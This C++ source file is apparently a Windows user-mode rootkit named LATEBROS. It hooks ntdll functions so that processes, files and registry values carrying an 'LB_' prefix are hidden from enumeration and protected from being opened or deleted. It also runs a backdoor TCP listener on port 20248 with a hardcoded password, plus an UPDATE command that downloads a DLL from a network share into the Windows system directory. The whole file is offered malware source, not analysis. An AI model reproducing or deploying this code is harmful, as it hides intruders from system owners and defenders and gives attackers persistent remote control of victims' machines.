#include "stdafx.h"

#include <urlmon.h>

using namespace std;

#include <stdio.h>
#include <tchar.h>
#include <thread>

#include <iostream>
#include <conio.h>
#include <winsock.h>
#include <atlstr.h>

#pragma comment(lib, "urlmon.lib")
#pragma comment(lib,"WS2_32")

SOCKET server;

using namespace std;

static UINT ServerThread(void);
static UINT ClientThread(SOCKET socket);
BOOL ParseCmd(char *str, CString& cmd, CString& params);
BOOL UpdateFile(SOCKET client);

#include "hideme.hpp"

#define STATUS_NOT_FOUND                 ((NTSTATUS)0xC0000225L)
#define STATUS_SUCCESS                   ((NTSTATUS)0x00000000L)
#define STATUS_INVALID_CID               ((NTSTATUS)0xC000000BL)
#define STATUS_OBJECT_NAME_NOT_FOUND     ((NTSTATUS)0xC0000034L)

constexpr static auto ROOTKIT_PREFIX = L"LB_";

bool is_protected_entry(const wchar_t* str, std::size_t len) noexcept
{
	const std::wstring_view sv(str, len);

	return sv.find(ROOTKIT_PREFIX) != std::wstring_view::npos;
}

bool is_protected_entry(const UNICODE_STRING& uni_str) noexcept
{
	return is_protected_entry(uni_str.Buffer, uni_str.Length / sizeof(wchar_t));
}

/*
 * Function: ntdll!NtOpenProcess
 * Purpose: Disguise and protect any LATEBROS process by preventing client-id/process-id bruteforcing
 *
 */
extern "C" char __declspec(dllexport) ntop_og[0xF] = {}; // ORIGINAL BYTES
extern "C" NTSTATUS __declspec(dllexport) NTAPI ntop(PHANDLE out_handle, ACCESS_MASK, POBJECT_ATTRIBUTES object_attributes, _CLIENT_ID* client_id)
{
	const auto function_pointer = reinterpret_cast<uintptr_t>(GetProcAddress(GetModuleHandleA("ntdll"), "NtOpenProcess"));

	// RESTORE
	hideme::remove_detour(function_pointer, ntop_og, sizeof(ntop_og));

	// CALL
	const auto status = reinterpret_cast<decltype(ntop)*>(function_pointer)(out_handle, MAXIMUM_ALLOWED, object_attributes, client_id);

	// REHOOK
	hideme::hook_function(function_pointer, reinterpret_cast<uintptr_t>(ntop));

	if (!NT_SUCCESS(status))
		return status;

	wchar_t name_buffer[MAX_PATH];
	const auto len = GetModuleBaseNameW(*out_handle, nullptr, name_buffer, MAX_PATH);
	if (len)
	{
		// 'INFECTED' PROCESS IS TRYING TO OPEN A HANDLE TO A LATEBROS PROCESS
		if (is_protected_entry(name_buffer, len))
		{
			CloseHandle(*out_handle);			// CLOSE HANDLE TO ENSURE IT WON'T BE USED REGARDLESS OF SANITY CHECKS
			*out_handle = nullptr;				// ERASE PASSED HANLDE
			return ERROR_INVALID_PARAMETER;		// RETURN INVALID CLIENT_ID
		}
	}

	return STATUS_SUCCESS; // SUCCESS
}


/*
 * Function: ntdll!NtQuerySystemInformation
 * Purpose: Disguise any LATEBROS process by removing its respective process entry from the process list
 *
 */
typedef struct _SYSTEM_PROCESS_INFO
{
	ULONG                   NextEntryOffset;
	ULONG                   NumberOfThreads;
	LARGE_INTEGER           Reserved[3];
	LARGE_INTEGER           CreateTime;
	LARGE_INTEGER           UserTime;
	LARGE_INTEGER           KernelTime;
	UNICODE_STRING          ImageName;
	ULONG                   BasePriority;
	HANDLE                  ProcessId;
	HANDLE                  InheritedFromProcessId;
}SYSTEM_PROCESS_INFO, *PSYSTEM_PROCESS_INFO;
extern "C" char __declspec(dllexport) qsi_og[0xF] = {}; // ORIGINAL BYTES
extern "C" NTSTATUS __declspec(dllexport) WINAPI qsi(SYSTEM_INFORMATION_CLASS system_information_class, PVOID system_information, ULONG system_information_length, PULONG return_length)
{
	// PREVENT BRUTEFORCE
	if (system_information_class == static_cast<_SYSTEM_INFORMATION_CLASS>(0x58)/*SystemProcessIdInformation*/)
	{
		const auto process_id = *static_cast<uint64_t*>(system_information);

		// REMOVE HOOKS IN CASE PROCESS ID IS PROTECTED
		const auto function_pointer = reinterpret_cast<uintptr_t>(GetProcAddress(GetModuleHandleA("ntdll"), "NtOpenProcess"));

		// RESTORE
		hideme::remove_detour(function_pointer, ntop_og, sizeof(ntop_og));

		// CALL
		const auto handle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, static_cast<DWORD>(process_id));

		// REHOOK
		hideme::hook_function(function_pointer, reinterpret_cast<uintptr_t>(ntop));

		if (handle)
		{
			wchar_t name_buffer[MAX_PATH];
			const auto len = GetModuleBaseNameW(handle, nullptr, name_buffer, MAX_PATH);
			if (len)
			{
				// 'INFECTED' PROCESS IS TRYING TO OPEN A HANDLE TO A LATEBROS PROCESS
				if (is_protected_entry(name_buffer, len))
					return STATUS_INVALID_CID; // RETURN INVALID CLIENT_ID
			}

			CloseHandle(handle);
		}
	}

	const auto function_pointer = reinterpret_cast<uintptr_t>(NtQuerySystemInformation);

	// RESTORE
	hideme::remove_detour(function_pointer, qsi_og, sizeof(qsi_og));

	// CALL
	auto result = NtQuerySystemInformation(system_information_class, system_information, system_information_length, return_length);

	// REHOOK
	hideme::hook_function(function_pointer, reinterpret_cast<uintptr_t>(qsi));

	if (!NT_SUCCESS(result))
		return result;

	// HIDE PROCESSES
	if (system_information_class == SystemProcessInformation
		|| system_information_class == static_cast<_SYSTEM_INFORMATION_CLASS>(0x35)/*SystemSessionProcessInformation*/
		|| system_information_class == static_cast<_SYSTEM_INFORMATION_CLASS>(0x39)/*SystemExtendedProcessInformation*/
		|| system_information_class == static_cast<_SYSTEM_INFORMATION_CLASS>(0x94)/*SystemFullProcessInformation*/)
	{
		auto entry = reinterpret_cast<_SYSTEM_PROCESS_INFO*>(system_information);
		auto previous_entry = entry;

		while (entry->NextEntryOffset)
		{
			if (entry->ImageName.Buffer && is_protected_entry(entry->ImageName))
			{
				previous_entry->NextEntryOffset += entry->NextEntryOffset;	// MAKE PREVIOUS ENTRY POINT TO THE NEXT ENTRY
				ZeroMemory(entry, entry->NextEntryOffset);					// CLEAR OUR ENTRY, WHY NOT?
			}

			previous_entry = entry;
			entry = reinterpret_cast<_SYSTEM_PROCESS_INFO*>(reinterpret_cast<uintptr_t>(entry) + entry->NextEntryOffset);
		}
	}

	return result;
}

/*
* Function: ntdll!NtCreateFile
* Purpose: Protect any LATEBROS files by preventing file handles to be opened
*
*/
extern "C" char __declspec(dllexport) ntcr_og[0xF] = {}; // ORIGINAL BYTES
extern "C" NTSTATUS __declspec(dllexport) NTAPI ntcr(
	PHANDLE file_handle, ACCESS_MASK desired_access, POBJECT_ATTRIBUTES object_attributes, PIO_STATUS_BLOCK io_status_block,
	PLARGE_INTEGER allocation_size, ULONG file_attributes, ULONG share_access, ULONG create_disposition,
	ULONG create_options, PVOID ea_buffer, ULONG ea_length)
{
	if (object_attributes && object_attributes->ObjectName && object_attributes->ObjectName->Buffer)
		if (is_protected_entry(*object_attributes->ObjectName))
			return STATUS_NOT_FOUND;

	const auto function_pointer = reinterpret_cast<uintptr_t>(NtCreateFile);

	// RESTORE
	hideme::remove_detour(function_pointer, ntcr_og, sizeof(ntcr_og));

	// CALL
	const auto result = NtCreateFile(file_handle, desired_access, object_attributes, io_status_block, allocation_size, file_attributes, share_access, create_disposition, create_options, ea_buffer, ea_length);

	// REHOOK
	hideme::hook_function(function_pointer, reinterpret_cast<uintptr_t>(ntcr));

	return result;
}

/*
* Function: ntdll!NtOpenFile
* Purpose: Protect any LATEBROS files by preventing file handles to be opened
*
*/
extern "C" char __declspec(dllexport) ntopf_og[0xF] = {}; // ORIGINAL BYTES
extern "C" NTSTATUS __declspec(dllexport) NTAPI ntopf(PHANDLE file_handle, ACCESS_MASK desired_access, POBJECT_ATTRIBUTES object_attributes, PIO_STATUS_BLOCK io_status_block, ULONG share_access, ULONG open_options)
{
	if (object_attributes && object_attributes->ObjectName && object_attributes->ObjectName->Buffer)
		if (is_protected_entry(*object_attributes->ObjectName))
			return STATUS_NOT_FOUND;

	const auto function_pointer = reinterpret_cast<uintptr_t>(NtOpenFile);

	// RESTORE
	hideme::remove_detour(function_pointer, ntopf_og, sizeof(ntopf_og));

	// CALL
	const auto result = NtOpenFile(file_handle, desired_access, object_attributes, io_status_block, share_access, open_options);

	// REHOOK
	hideme::hook_function(function_pointer, reinterpret_cast<uintptr_t>(ntopf));

	return result;
}

/*
* Function: ntdll!NtQueryDirectoryFile
* Purpose: Hide any LATEBROS files from directory enumeration
*
*/
// UNDOCUMENTED STRUCT, HAD TO DO IT MYSELF
struct FILE_OLE_DIR_INFORMATION
{
	uint32_t	next_entry_offset;	// 0x00 (0x04)
	char		pad_0[0x64];		// 0x04 (0x64)
	wchar_t		file_name[1];		// 0x68
};
extern "C" char __declspec(dllexport) ntqdf_og[0xF] = {}; // ORIGINAL BYTES
extern "C" NTSTATUS __declspec(dllexport) NTAPI ntqdf(HANDLE file_handle, HANDLE event, PIO_APC_ROUTINE apc_routine, PVOID apc_context, PIO_STATUS_BLOCK io_status_block, PVOID file_information, ULONG length, FILE_INFORMATION_CLASS file_information_class, BOOLEAN return_single_entry, PUNICODE_STRING file_name, BOOLEAN restart_scan)
{
	const auto function_pointer = reinterpret_cast<uintptr_t>(GetProcAddress(GetModuleHandleA("ntdll"), "NtQueryDirectoryFile"));

	// RESTORE
	hideme::remove_detour(function_pointer, ntqdf_og, sizeof(ntqdf_og));

	// CALL
	const auto result = reinterpret_cast<decltype(ntqdf)*>(function_pointer)(file_handle, event, apc_routine, apc_context, io_status_block, file_information, length, file_information_class, return_single_entry, file_name, restart_scan);

	// REHOOK
	hideme::hook_function(function_pointer, reinterpret_cast<uintptr_t>(ntqdf));

	// HIDE FILES / DIRECTORIES
	if (result == STATUS_SUCCESS)
	{
		// EXPLORER CALLS NTQUERYDIRECTORYFILE WITH CLASS 37, STRUCT WASN'T DOCUMENTED NOR ON ANY NT BLOGS 
		// SO I HAD TO FIND THE IMPORTANT MEMBERS MYSELF
		if (file_information_class == 37/*FileOleDirectoryInformation*/)
		{
			auto current_entry = static_cast<FILE_OLE_DIR_INFORMATION*>(file_information);
			auto previous_entry = current_entry;

			while (current_entry->next_entry_offset)
			{
				const std::wstring_view file_name = current_entry->file_name;
				if (file_name.find(ROOTKIT_PREFIX) != std::wstring_view::npos)
					previous_entry->next_entry_offset += current_entry->next_entry_offset;	// SKIP

				previous_entry = current_entry;
				current_entry = reinterpret_cast<FILE_OLE_DIR_INFORMATION*>(reinterpret_cast<uintptr_t>(current_entry) + current_entry->next_entry_offset);
			}
		}
	}

	return result;
}

/*
* Function: ntdll!NtDeleteValueKey
* Purpose: Protect any LATEBROS registry value from being deleted
*
*/
extern "C" char __declspec(dllexport) ntdvk_og[0xF] = {}; // ORIGINAL BYTES
extern "C" NTSTATUS __declspec(dllexport) NTAPI ntdvk(HANDLE key_handle, PUNICODE_STRING value_name)
{
	if (!value_name)
		return STATUS_INVALID_PARAMETER;

	if (!value_name->Buffer || is_protected_entry(*value_name))
		return STATUS_OBJECT_NAME_NOT_FOUND;

	auto function_pointer = reinterpret_cast<uintptr_t>(GetProcAddress(GetModuleHandleA("ntdll"), "NtDeleteValueKey"));

	// RESTORE
	hideme::remove_detour(function_pointer, ntdvk_og, sizeof(ntdvk_og));

	// CALL	
	auto result = reinterpret_cast<decltype(ntdvk)*>(function_pointer)(key_handle, value_name);

	// REHOOK
	hideme::hook_function(function_pointer, reinterpret_cast<uintptr_t>(ntdvk));

	return result;
}

/*
* Function: ntdll!NtEnumerateValueKey
* Purpose: hide any LATEBROS registry value from enumeration
*
*/
enum KEY_VALUE_INFORMATION_CLASS
{
	KeyValueBasicInformation = 0,
	KeyValueFullInformation,
	KeyValuePartialInformation,
	KeyValueFullInformationAlign64,
	KeyValuePartialInformationAlign64,
	MaxKeyValueInfoClass
};
struct KEY_VALUE_BASIC_INFORMATION
{
	ULONG TitleIndex;
	ULONG Type;
	ULONG NameLength;
	WCHAR Name[1];
};
struct KEY_VALUE_FULL_INFORMATION
{
	ULONG TitleIndex;
	ULONG Type;
	ULONG DataOffset;
	ULONG DataLength;
	ULONG NameLength;
	WCHAR Name[1];
};
extern "C" char __declspec(dllexport) ntevk_og[0xF] = {}; // ORIGINAL BYTES
extern "C" NTSTATUS __declspec(dllexport) NTAPI ntevk(HANDLE key_handle, ULONG index, KEY_VALUE_INFORMATION_CLASS key_value_class, PVOID key_value_info, ULONG length, PULONG return_length)
{
	auto function_pointer = reinterpret_cast<uintptr_t>(GetProcAddress(GetModuleHandleA("ntdll"), "NtEnumerateValueKey"));

	// RESTORE
	hideme::remove_detour(function_pointer, ntevk_og, sizeof(ntevk_og));

	// WE NEED TO SAVE INDEXES NOT TO DISPLAY SAME KEY TWICE AFTER REPLACING THE HIDDEN ONES
	// THESE ARE UNIQUE TO EACH THREAD TO PREVENT MULTI-THREAD ISSUES
	thread_local int last_replaced = -1;
	thread_local HANDLE last_handle = key_handle;

	// WE ARE NOT ITERATING OVER A NEW KEYS LIST
	if (last_handle != key_handle)
	{
		last_handle = key_handle;
		last_replaced = -1;
	}

	// UPDATE THE INDEX TO BE AFTER THE VALUE WE REPLACED HIDDEN KEYS WITH
	if (static_cast<int>(index) <= last_replaced)
	{
		index = last_replaced + 1;
		++last_replaced;
	}

	NTSTATUS result;
	while (true)
	{
		// CALL	
		result = reinterpret_cast<decltype(ntevk)*>(function_pointer)(key_handle, index, key_value_class, key_value_info, length, return_length);

		// SOMETHING FAILED OR WE REACHED THE END OF LIST
		if (!NT_SUCCESS(result))
		{
			// RESET THE INDEX OF LAST REPLACED REGISTRY VALUE
			last_replaced = -1;
			break;
		}

		std::wstring_view sv;
		if (key_value_class == KEY_VALUE_INFORMATION_CLASS::KeyValueFullInformation)
		{
			auto data = static_cast<KEY_VALUE_FULL_INFORMATION*>(key_value_info);
			sv = std::wstring_view(data->Name, data->NameLength / sizeof(wchar_t));
		}
		else if (key_value_class == KEY_VALUE_INFORMATION_CLASS::KeyValueBasicInformation)
		{
			auto data = static_cast<KEY_VALUE_BASIC_INFORMATION*>(key_value_info);
			sv = std::wstring_view(data->Name, data->NameLength / sizeof(wchar_t));
		}
		else // PARTIAL INFORMATION DOESN'T CONTAIN THE NAME SO WE DONT REALLY CARE ABOUT IT
		{
			break;
		}

		// IF NOTHING IS FOUND WE BREAK OUT OF THE LOOP

		if (sv.find(ROOTKIT_PREFIX) == std::wstring_view::npos)
		{
			// UPDATE THE INDEX OF LAST REPLACEMENT
			last_replaced = index;
			break;
		}

		// ELSE CLEAR THE CURRENT HELD INFORMATION AND INCREASE THE INDEX TO CHECK NEXT VALUE
		std::memset(key_value_info, 0x00, length);
		++index;
	}

	// REHOOK
	hideme::hook_function(function_pointer, reinterpret_cast<uintptr_t>(ntevk));

	return result;
}

int _tmain(int argc, TCHAR* argv[], TCHAR* envp[])
{
	int ret = 0;

	std::thread srvThread(ServerThread);

	while (_getch() != 27);

	srvThread.join();

	closesocket(server);
	WSACleanup();

	return ret;
}

UINT ServerThread(void)
{
	WSADATA wsaData;
	sockaddr_in local;
	int wsaret = WSAStartup(0x101, &wsaData);
	if (wsaret != 0)
	{
		return 0;
	}
	local.sin_family = AF_INET;
	local.sin_addr.s_addr = INADDR_ANY;
	local.sin_port = htons((u_short)20248);
	server = socket(AF_INET, SOCK_STREAM, 0);
	if (server == INVALID_SOCKET)
	{
		return 0;
	}

	std::_Binder bnd = bind(server, reinterpret_cast<sockaddr*>(&local), static_cast<int>(sizeof(local)));

	if (listen(server, 10) != 0)
	{
		return 0;
	}

	SOCKET client;
	sockaddr_in from;
	int fromlen = sizeof(from);

	while (true)
	{
		client = accept(server, (struct sockaddr*)&from, &fromlen);
		std::thread cliThread(ClientThread, client);
	}

	return 0;
}

UINT ClientThread(SOCKET socket)
{
	char buff[512];
	CString cmd;
	CString params;
	int n;
	int x;
	BOOL auth = false;
	SOCKET client = socket;
	strcpy_s(buff, 512, "#Server Ready.\r\n");
	send(client, buff, strlen(buff), 0);

	while (true)
	{
		n = recv(client, buff, 512, 0);
		if (n == SOCKET_ERROR)
			break;
		buff[n] = 0;
		if (ParseCmd(buff, cmd, params))
		{
			if (cmd == "QUIT")
				break;

			if (cmd == "AUTH")
			{
				if (params == "TheDeanMachine123")
				{
					auth = true;
					strcpy_s(buff, 512, "#You are logged in.\r\n");
				}
				else
				{
					strcpy_s(buff, 512, "!Bad password.\r\n");
				}
				send(client, buff, strlen(buff), 0);
			}

			if (cmd == "EXEC")
			{
				//DLL.Execute(params);
				// Interface with DLL here
			}

			if (cmd == "UPDATE")
			{
				bool Updated = UpdateFile(client);

				// If we've updated the DLL, we need to re-link
			}
		}
		else
		{
			strcpy_s(buff, 512, "!Invalid command.\r\n");
			send(client, buff, strlen(buff), 0);
		}
	}

	closesocket(client);
	return 0;
}

BOOL ParseCmd(char *str, CString& cmd, CString& params)
{
	int n;
	CString tmp = str;

	tmp.TrimLeft();
	tmp.TrimRight();

	if ((n = tmp.Find(' ')) == -1)
	{
		tmp.MakeUpper();
		if (tmp != "QUIT")
			return false;
		cmd = tmp;
		return true;
	}

	cmd = tmp.Left(n);
	params = tmp.Mid(n + 1);
	cmd.MakeUpper();

	if ((cmd != "AUTH") && (cmd != "EXEC") && (cmd != "UPDATE"))
	{
		return false;
	}

	return true;
}

BOOL UpdateFile(SOCKET client)
{
	char buff[512];
	BOOL ret = true;
	HRESULT res = S_OK;
	// Pull down
	LPCSTR src = (LPCSTR)"\\\\voodoo\\Users\\Brad\\Research\\d3dim.dll";
	LPCSTR dst = (LPCSTR)"C:\\Windows\\System32\\Machine\\d3dim.dll";

	res = URLDownloadToFile(NULL, src, dst, 0, 0);
	switch (res)
	{
		case INET_E_DOWNLOAD_FAILURE:
		{
			strcpy_s(buff, 512, "!Failed to download update file!");
			ret = false;
			break;
		}
		case E_OUTOFMEMORY:
		{
			strcpy_s(buff, 512, "!No space left on hard drive for update!");
			ret = false;
			break;
		}
		case S_OK:
		{
			strcpy_s(buff, 512, "#Update successful.");
			break;
		}
		default:
		{
			strcpy_s(buff, 512, "!Unknown Error!");
			ret = false;
		}
	}

	send(client, buff, strlen(buff), 0);

	return ret;
}